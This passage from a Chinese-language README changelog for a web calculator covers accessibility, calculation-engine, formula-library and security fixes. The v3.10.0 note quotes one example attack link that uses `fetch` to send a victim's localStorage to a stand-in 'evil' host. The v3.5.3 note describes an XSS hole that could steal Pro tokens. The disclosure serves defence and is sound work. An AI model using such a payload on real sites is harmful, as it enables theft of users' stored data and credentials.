...
♿ **v3.10.1 付款 modal 焦點陷阱**（2026-08-14）：v3.10.0 堵住了「該視窗開著時打字與貼上灌進背景計算機」，本版補上另一半 —— 鍵盤焦點原本仍會 Tab 出視窗外。焦點管理抽成 `trapModalFocus()` / `releaseModalFocus()` 由兩套 modal 顯示機制共用（`.active` 與 `hidden` 屬性），並補上 `role="dialog"` / `aria-modal`。詳見 [CHANGELOG](CHANGELOG.md#3101---2026-08-14--a11y-付款--授權碼-modal-的焦點陷阱)。

🔒 **v3.10.0 安全修復（CRITICAL，既有漏洞）**（2026-08-14）：`#calc=` 網址參數原本**零驗證**直接寫入計算機並交給 `new Function()` 求值 —— `#calc=1,(fetch('//evil/?d='+JSON.stringify(localStorage)))` 這種連結，受害者點開後只要按一次 `=` 就會執行（JS 的逗號運算子讓它成為 `return` 表達式的一部分）。本地已實測重現。現在這條路徑與貼上共用同一套文法驗證，驗不過就不填。同時修掉：付款／授權碼視窗（`#pro-modal`）不在輸入守衛範圍內，實測會讓打字與貼上灌進背景計算機；`factorial()` 無上限導致一行輸入即可凍結分頁。詳見 [CHANGELOG](CHANGELOG.md#3100---2026-08-14--feat-記憶鍵-mmmrmc--剪貼簿貼上含一個-critical-安全修復)。

🧠 **v3.10.0 記憶鍵 + 剪貼簿貼上**（2026-08-14）：補上兩件一台計算機本來就該有、這台卻一直沒有的事 —— **記憶鍵 M+ / M− / MR / MC**（全檔 `memory` 命中原本是 0）與 **Ctrl/Cmd+V 貼上**（原本只有 `writeText`，只出得去進不來）。M+ 會先把目前算式求值再累加（螢幕上是 `12×7` 存進去的是 `84`），記憶值存在 localStorage、關分頁再開仍在；記憶為空時 MC/MR 呈停用。貼上走**文法驗證**而非字元清洗：`calculate()` 最終是 `new Function()` 求值，而貼上是第一次讓外部字串進入這條路徑，因此整段必須能被 tokenizer 完整吃完，否則整段拒絕（`exp.call(1)` 這類用合法函數名開頭的字串在文法層就被擋下）。全形符號、各種 dash、千分位逗號會自動正規化，但千分位只在整段沒有函數呼叫時才拆 —— `nCr(5,123)` 長得跟千分位一模一樣。詳見 [CHANGELOG](CHANGELOG.md#3100---2026-08-14--feat-記憶鍵-mmmrmc--剪貼簿貼上含一個-critical-安全修復)。
...
🔍 **v3.8.4 SEO + a11y 深審**（2026-07-18）：Lighthouse mobile 實測 Perf 98 / SEO 100 / CWV 全達標後修齊剩餘缺口 — 新增 `og:image` 社群分享圖與 FAQPage JSON-LD（FAQ 擴至 5 題）、guide/footer 對比度雙主題合規（新 `--guide-accent` token）、補 `<main>` landmark。Carbon Ads 申請**被拒**，pricing 文案同步誠實化（Free 目前無廣告）。詳見 [CHANGELOG](CHANGELOG.md#384---2026-07-18--quality-seo--a11y-深審修復ogimage--faqpage--對比度--main-landmark)。
...
- [專案介紹](#專案介紹)
- [v3.6 無障礙強化 ♿](#v36-無障礙強化-)
- [v3.5 計算核心修復 + 角度模式 🧮](#v35-計算核心修復--角度模式-)
- [v3.4 安全強化與品牌保護 🛡️](#v34-安全強化與品牌保護-)
...
v3.6.0（2026-05-22）為一輪 WCAG 2.1 AA 無障礙深度審查後的修復，補齊自專案建立以來缺漏的鍵盤操作與螢幕閱讀器支援。**全部經本地瀏覽器逐項實測、零回歸、零 console error**：

- **鍵盤焦點指示器**（WCAG 2.4.7）：新增全域 `:focus-visible` 樣式，所有按鈕、tab、輸入框於鍵盤操作時顯示清晰的青色外框。先前全站無任何焦點指示，鍵盤使用者完全看不出位置。
- **說明手風琴可鍵盤操作**（WCAG 2.1.1，Level A）：6 個說明區塊標題原為純滑鼠 `<div>`、僅綁 `click`，鍵盤使用者完全無法展開。現加 `role=button`、`tabindex`、`aria-expanded`，並支援 Enter / Space 鍵切換。
- **Modal 對話框語義 + 焦點管理**：3 個 modal（使用說明 / 公式計算 / 函數繪圖）加上 `role=dialog`、`aria-modal`、`aria-labelledby`；新增焦點移入、焦點陷阱（Tab 循環不外漏）、Escape 關閉、關閉後焦點還原至觸發按鈕。
- **標題層級修正**（WCAG 1.3.1）：頁面主標題改為 `<h1>`、側邊欄標題層級重整為 `h2`/`h3`，文件大綱不再跳階。
- **螢幕閱讀器朗讀**：計算結果顯示區與 toast 通知加 `aria-live`，運算結果與提示訊息可被即時朗讀。
- **無障礙名稱**：主題切換鈕等圖示按鈕加 `aria-label`；7 個下拉選單與多個 placeholder-only 輸入框補齊標籤。
- **行動裝置觸控目標**：函數繪圖工具列按鈕於手機提升至 44px 觸控標準；順手修正一處未定義 CSS 變數。

詳見 [更新日誌](CHANGELOG.md)。

---

## v3.5 計算核心修復 + 角度模式 🧮

v3.5（2026-05-19）為一輪完整使用性體驗審查後的修復，**所有修復皆經瀏覽器逐功能實測、零回歸、零 console error**：

- **修復 `%` 百分比運算符**（CRITICAL）：原本 `50%`、`100+5%` 等任何含 `%` 的計算都回 `Error`。現採標準計算機語意：`50%`→0.5、`100+5%`→105、`200×10%`→20。
- **修復函數鍵在初始狀態無法使用**（HIGH）：原本顯示為 `0` 時按 `sin( log( √(` 等會直接 `Error`，現可正常輸入；連帶修掉 `√` 二次替換的隱藏 bug。
- **新增 DEG / RAD 角度模式切換**（預設 DEG）：頂部新增切換鈕、`localStorage` 持久化。`sin(90)`=1 符合一般使用者預期；亦支援弧度模式。
- **修復單位換算結果框空白**（MEDIUM）：換算結果 ≥ 1000 時因千分位逗號與 `type=number` 衝突而清空，現雙向換算、類別切換、溫度特殊轉換皆正常。
- **`sw.js` 快取版本 bump**：Service Worker 為 cache-first，已更新 `CACHE_NAME` 確保既有使用者立即取得修復。

**v3.5.1（2026-05-20）追加修復**——延續審查，深測進位 / 工程 / 科學模式：

- **工程 `mod` 鍵失效**（v3.5.0 回歸）：百分比預處理誤改 `mod` 的 `%`，現分離處理，`7 mod 3`=1，百分比不受影響。
- **進位 HEX 缺 `C` 鍵**：補回十六進位 `C`，`C0`→DEC 192 正確。
- **`nCr(n,r)` / `nPr(n,r)` 無法輸入**：全站缺逗號鍵，已於側邊欄常用區新增 `,`，`nCr(5,2)`=10 可用。

**v3.5.2（2026-05-20）手機響應式 Bug C 修復**：

- **手機 `( ) , π e` 無法輸入**（HIGH）：≤768px 時側邊欄整組被隱藏，所有需閉合括號的函式（`sin(`、`cos(`、`log(`、`exp(`…）於手機完全失效。修復策略——DOM 零改動、純 CSS 響應式重排：≤768px 時側邊欄變為底部固定浮動列（業界標準 mobile keyboard 模式），保留 5 顆關鍵鍵（π e ( ) ,）橫向 5 欄等寬、`min-height: 44px` 觸控標準、半透明背景配合深淺主題、支援 iPhone safe-area。桌機 1280 零回歸。

**v3.5.9（2026-05-22）公式庫突破 100 條 + 修組合數溢位與三角函數浮點殘渣**：修復兩個自計算引擎建立以來即存在的瑕疵。(1) **`nCr` / `nPr` 大數溢位**——原以 `factorial(n)/(factorial(r)*factorial(n-r))` 計算，而 `factorial(171)` 已是 `Infinity`，使 `nCr(171,2)` 回傳 `Infinity`、`nCr(1000,500)` 回傳 `NaN`，最終都顯示 `Error`；改用 multiplicative formula 逐項累乘並以對稱性減少迭代，`nCr(171,2)=14535`、`nCr(1000,500)≈2.70e+299`、`nPr(100,3)=970200` 全綠。(2) **三角函數特殊角浮點殘渣**——DEG 模式 `sin(180°)` 回傳 `1.22e-16`、`cos(90°)` 回傳 `6.12e-17`；改為在三角函數層、僅對整數特殊角精確 snap（刻意不採結果層 threshold-snap，因合法科學常數比殘渣更小會被誤殺），`sin(180°)=0`、`cos(90°)=0`、`tan(180°)=0`，回歸 `sin(30°)=0.5`、`sin(45°)=0.707` 全綠。同版本公式庫擴充 12 條達 **100 條里程碑**：科學 +3（半衰期、光波長、理想氣體體積）、物理 +4（壓力、功率、浮力、質能等價 E=mc²）、數學 +2（球表面積、指數成長）、工程 +1（分壓定則）、金融 +2（毛利率、股息殖利率）；id 50 理想氣體氣體常數同步精確化為 `8.314462618`。詳見 [更新日誌](CHANGELOG.md)。

**v3.5.8（2026-05-21）全面點擊測試：修 2 bug + 物理常數精確化**：對全站 5 大分頁 + Header 做一輪全面點擊測試（約 90 個案例），揪出 2 個真實 bug 並一次修齊。(1) **`|x|` 絕對值鍵必定 Error**——`calculate()` 把每個 `|` 都替換成 `Math.abs(` 卻缺對應 `)`，改為成對轉換 `/\|([^|]*)\|/g`，`|3−9|`=6、`2×|3−8|`=10 全綠。(2) **CSV 匯出對數字型結果靜默崩潰**——`row.result.replace()` 對 Number 拋 `TypeError`（約 89% 結果為 number 型），改為 `String(row.result)`。同時把物理常數從 4 位有效數字近似值升級為 **CODATA / SI 2019 精確值**：光速 299792458、普朗克 6.62607015×10⁻³⁴、波茲曼 1.380649×10⁻²³、引力常數 6.6743×10⁻¹¹、亞佛加厥 6.02214076×10²³、氣體常數 8.314462618、電子電荷 1.602176634×10⁻¹⁹；公式庫 3 條內嵌常數同步、指數結果尾隨零一併修掉。詳見 [更新日誌](CHANGELOG.md)。

**v3.5.7（2026-05-21）公式資料一致性審查：命名修正 + 文件去過時**：對公式庫與對外文件做一輪一致性深審。修正「目標心率」公式掛錯名——id 93 公式 `(220-a)*intensity/100` 實為「最大心率百分比法」（%MaxHR），並非 Karvonen 法（真正 Karvonen 需靜息心率變數），公式正確、僅名稱錯，已改名 `目標心率(%最大心率)`。同時清掉多處過時敘述：index.html 說明區「83 條 / 47 條 / 五大分類」全部修正為「88 條 / 六大分類」；README 公式分類總覽表（中／英）原列「幾何 / 物理 / 化學 / 財務」與實機完全不符，重建為實機 6 分類；`docs/FORMULAS.md` 自 v1.0.0 從未更新，重建為完整 88 條清單。**無 calculate engine 邏輯變更**。

**v3.5.6（2026-05-20）calculate engine 邊界 audit + 健康分類 +5 公式**：承 v3.5.5 修完兩個 engine bug 後主動跑 12 case audit（大整數 / 浮點誤差 / 除零 / log/sqrt 邊界 / factorial / toFixed / 常數 / 科學記號）—— engine 健全、無需修補。同時拓展健康分類 +5 條：TDEE 男/女、體脂率 Deurenberg 男/女、每日水分需求。公式庫 83 → **88 條**、健康分類 4 → **9 條**。例：70kg/170cm/30 男活動係數 1.55 → TDEE 2507 大卡/日、體脂率 19.77%。

**v3.5.5（2026-05-20）+20 公式 / 新增「健康」分類 / 修 calculate engine 兩個 latent bug**：公式庫 63 → **83 條（+32%）**，新增**健康**為第 6 個分類（BMI、BMR 基礎代謝率、目標心率），數學增 7 條（海倫公式、扇形面積/弧長、等差/等比數列和、向量長度/內積），物理增 5 條（向心加速度、彈簧簡諧週期、彈簧位能、普朗克 E=hf、動摩擦），金融增 2 條（實質年利率 EAR、損益平衡點 BEP），工程增 2 條（LC 諧振頻率、RC 截止頻率）。意外揪出 calculate engine 兩個自始即有的 latent bug：(1) Math.E regex 把 `6.626e-34` 中的 `e` 誤替成 2.718，連帶萬有引力/庫倫力/普朗克全失效；(2) `toFixed(12)` 對極小數字 underflow 為 0。兩 bug 一起修 → 普朗克 `3.313e-19`、萬有引力 `1.982e+20` 終於正確顯示。

**v3.5.4（2026-05-20）built-in 公式 render 統一 escape pattern**：v3.5.3 修完自建公式 XSS 後，built-in 公式（63 張卡）的同款不安全 `onclick=` 字串拼接 pattern 留為技術債（無使用者 injection 面，但日後若加入含 `'` 的名稱會 break）。本版統一改用 `data-*` 屬性 + `addEventListener` + `escapeFormulaHtml()`，與自建 render path 對齊；defense-in-depth、零功能變更。端對端通過：圓面積 r=5 → 78.5398、勾股 a=3 b=4 → 5、複利 P=10000 r=5 n=12 t=10 → 16470.0949。

詳見 [更新日誌](CHANGELOG.md)。

**v3.5.3（2026-05-20）深審 + 三修**：對 README 主打賣點（函數繪圖 / 統計 / 3D / 公式庫 / Pro gate）做瀏覽器逐功能實測，揪出三個既存問題並一次性修復：

- **graphModal 結構吞噬 SEO 教學專欄 + footer**（CRITICAL，從 site launch 起就壞）：`</div>` 閉合位置錯誤把 `<section id="guide">` 與 `<footer>` 誤包進 modal 內，導致 modal 關閉時（99% 時間）兩者整段 `display:none`——SEO 內容、AdSense 素材、版權與 trust signals 從未對使用者渲染。修法：移正閉合位置，section 與 footer 解放為 body 直接子孫。
- **自建公式 XSS 注入**（CRITICAL，CWE-79）：`customFormulaItem()` 把使用者輸入的公式名稱／表達式直接拼進 `onclick=` 字串，可竊取 localStorage（含 Pro JWT token）或繞過 Pro gate。修法：捨棄 inline onclick、改 `data-*` 屬性 + `addEventListener` 綁定 + HTML escape。
- **`y=` / `f(x)=` 前綴被誤判為參數**（MEDIUM）：函數繪圖輸入 `y=x^2` 被接受、清單顯示 `y = y=x^2`、額外建出無意義 `y` slider。修法：add 前 strip 該前綴；合法的 `x^2+y^2` 仍正確視 `y` 為自由參數。

Pro gate（7 個）+ free 功能（4 個）行為驗證全部正確、無誤鎖、無誤通。
...
v3.4（2026-05-16）在不更動 MIT 授權的前提下，疊加多層保護並強化 Worker：

- **IP / 品牌保護層**：新增 `NOTICE.md`、`TERMS.md`，明確保留商標（`∑ Calc™`、`∑ Super Calculator™`、`∑ Calc Pro™`、`MoneyAI168™`）、官方 SaaS 服務範圍與視覺資產。原始碼仍為 MIT，可自由 fork（fork 須改名）。
- **Worker KV-based rate limiting**（v2.3.0）：`/license/issue` 雙層限速——每 IP 10 次/60 秒、每 subscriptionId 5 次/3600 秒。實測 Cloudflare Rate Limiting binding 在 Dashboard 部署下無法跨請求計數，故改用 KV fixed-window（跨請求有效、支援任意窗口）。KV 故障時 graceful degrade。
- **`/webhook/paypal` 來源 IP 觀察**（log-only）：比對 PayPal 官方公布 CIDR，非相符來源僅記錄不封鎖（PayPal 官方不建議硬性 IP allowlist；簽名驗證仍為主防護）。
- **Custom domain**：Live License Worker 改由 `https://api.moneyai168.com` 提供（`*.workers.dev` 並存，零停機）。
...
| 分類 | 公式數量 | 範例 |
|------|----------|------|
| 數學 | 32 | 圓面積 `A=πr²`、海倫公式、勾股定理、二次函數、向量內積 |
| 物理 | 17 | 牛頓第二定律 `F=ma`、動能 `E=½mv²`、萬有引力、普朗克能量 `E=hf` |
| 金融 | 11 | 複利終值、實質年利率 EAR、損益平衡點、72 法則、年金現值 |
| 工程 | 11 | 歐姆定律 `V=IR`、電功率、LC 諧振頻率、RC 截止頻率 |
| 健康 | 9 | BMI、BMR（Mifflin-St Jeor）、TDEE、體脂率（Deurenberg）、目標心率 |
| 科學 | 8 | 理想氣體定律 `PV=nRT`、pH 值、莫耳濃度、波耳模型能量 |
